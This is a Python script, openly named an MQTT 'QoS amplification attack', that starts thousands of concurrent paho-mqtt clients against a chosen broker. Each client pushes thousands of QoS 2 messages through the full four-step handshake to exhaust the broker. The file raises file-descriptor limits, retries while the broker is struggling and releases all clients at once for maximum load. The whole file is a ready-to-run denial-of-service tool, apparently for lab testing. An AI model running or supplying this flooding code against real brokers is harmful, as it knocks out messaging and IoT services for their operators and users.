#!/usr/bin/env python3
import paho.mqtt.client as mqtt
import os
import resource
import select
import sys
import threading
import time

start = threading.Event()

def network_step(client, poller, timeout_ms):
    # paho networking through poll(): the select() in loop()/loop_start() fails with fd > 1023
    sock = client.socket()
    if sock is None:
        return False
    poller.modify(sock, select.POLLIN | (select.POLLOUT if client.want_write() else 0))
    for _, events in poller.poll(timeout_ms):
        if events & select.POLLOUT and client.loop_write():
            return False
        if events & ~select.POLLOUT and client.loop_read():
            return False
    return client.loop_misc() == mqtt.MQTT_ERR_SUCCESS

def qos_amplification_attack(broker, port, client_id, count, delay_ms):
    client = mqtt.Client(client_id=f"amplifier_{client_id}")
    client.username_pw_set(os.getenv("MQTT_USER", "attacker"), os.getenv("MQTT_PASS", "attackerpass"))
    done = 0
    def on_publish(c, userdata, mid):  # QoS 2: called on PUBCOMP
        nonlocal done
        done += 1
    client.on_publish = on_publish
    deadline = time.monotonic() + 20  # an unreachable broker still ends the attack
    while True:
        try:
            client.connect(broker, port, 60)
            break
        except OSError as err:
            # A broker slow to accept() (e.g. busy hashing passwords) can leave the SYN unanswered past paho's 5 s timeout
            if time.monotonic() >= deadline:
                print(f"Client {client_id} could not connect: {err}", flush=True)
                return
            print(f"Client {client_id} connect failed ({err}), retrying", flush=True)
            time.sleep(1)
    poller = select.poll()
    poller.register(client.socket())
    # Common start: with the GIL busy with clients already running, the main thread would create the others slowly
    start.wait()
    
    # QoS 2 garante entrega exatamente uma vez - 4 handshakes!
    # PUBLISH -> PUBREC -> PUBREL -> PUBCOMP
    sent = 0
    while done < count:
        # Up to 20 in flight (paho max_inflight) without queuing all COUNT messages in memory
        window_open = sent < count and sent - done < 20
        if window_open:
            client.publish("amp/target", f"QoS2_Amplified_{client_id}_{sent}", qos=2)
            sent += 1
            if delay_ms > 0:
                time.sleep(delay_ms / 1000)
        if not network_step(client, poller, 0 if window_open else 1000):
            print(f"Client {client_id} lost connection after {done}/{count} QoS 2 handshakes")
            return
    
    client.disconnect()
    print(f"Client {client_id} completed QoS amplification")

if __name__ == "__main__":
    broker = sys.argv[1] if len(sys.argv) > 1 else "localhost"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 1883
    threads_count = int(os.getenv("THREADS", "2000"))
    count = int(os.getenv("COUNT", "2000"))
    delay_ms = int(os.getenv("DELAY_MS", "0"))

    # One socket per client: THREADS clients do not fit the default soft nofile limit of the container (1024)
    _, hard = resource.getrlimit(resource.RLIMIT_NOFILE)
    resource.setrlimit(resource.RLIMIT_NOFILE, (hard, hard))

    threads = []
    try:
        for i in range(threads_count):  # clients x QoS 2 messages
            t = threading.Thread(target=qos_amplification_attack, args=(broker, port, i, count, delay_ms))
            threads.append(t)
            t.start()
    finally:
        start.set()

    for t in threads:
        t.join()

    print("QoS Amplification attack completed")
